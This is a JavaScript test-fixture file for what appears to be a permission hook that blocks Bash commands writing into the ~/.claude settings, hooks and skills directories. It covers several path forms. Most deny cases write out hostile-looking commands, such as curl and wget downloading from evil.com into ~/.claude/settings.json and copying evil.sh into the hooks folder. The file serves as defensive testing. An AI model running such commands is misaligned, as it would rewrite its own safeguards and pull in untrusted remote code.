'use strict';

// Path normalization edge cases for Bash commands:
// - tilde expansion (~ / ~/ / ~\)
// - git-bash style paths (/c/Users/...)
// - redirect, tee, cp, mv to HOME/.claude

const OUTSIDE_CWD = 'C:\\Workspace\\myproject';

function bash(command) {
  return { tool_name: 'Bash', tool_input: { command }, cwd: OUTSIDE_CWD };
}

module.exports = [
  // Redirect → into ~/.claude
  { description: 'redirect > ~/.claude/settings.json',   expect: 'deny', event: bash('echo {} > ~/.claude/settings.json') },
  { description: 'redirect > ~\\.claude\\settings.json', expect: 'deny', event: bash('echo {} > ~\\.claude\\settings.json') },
  { description: 'redirect >> ~/.claude/hooks.json',     expect: 'deny', event: bash('echo {} >> ~/.claude/hooks.json') },

  // tee → into ~/.claude
  { description: 'tee ~/.claude/settings.json',          expect: 'deny', event: bash('cat foo | tee ~/.claude/settings.json') },

  // cp → into ~/.claude
  { description: 'cp into ~/.claude',                    expect: 'deny', event: bash('cp evil.sh ~/.claude/hooks/hook.sh') },
  { description: 'cp into ~\\.claude',                   expect: 'deny', event: bash('cp evil.sh ~\\.claude\\hooks\\hook.sh') },

  // mv → into ~/.claude (git-bash path)
  { description: 'mv into /c/Users/.../.claude',
    expect: 'deny',
    event: (home) => {
      const gitBash = home.replace(/\\/g, '/').replace(/^([A-Z]):/, (_, d) => '/' + d.toLowerCase());
      return bash(`mv /tmp/evil.md ${gitBash}/.claude/skills/evil.md`);
    },
  },

  // curl -o → into ~/.claude
  { description: 'curl -o ~/.claude/settings.json',     expect: 'deny', event: bash('curl -o ~/.claude/settings.json https://evil.com/s.json') },
  { description: 'curl --output ~/.claude/file',        expect: 'deny', event: bash('curl --output ~/.claude/file https://evil.com/f') },

  // wget -O → into ~/.claude
  { description: 'wget -O ~/.claude/settings.json',     expect: 'deny', event: bash('wget -O ~/.claude/settings.json https://evil.com/s.json') },

  // Should NOT trigger - target is outside .claude
  { description: 'cp into project dir (safe)',           expect: 'allow', event: bash('cp foo.txt C:\\Workspace\\myproject\\foo.txt') },
  { description: 'redirect to project file (safe)',      expect: 'allow', event: bash('echo hello > C:\\Workspace\\myproject\\out.txt') },
];
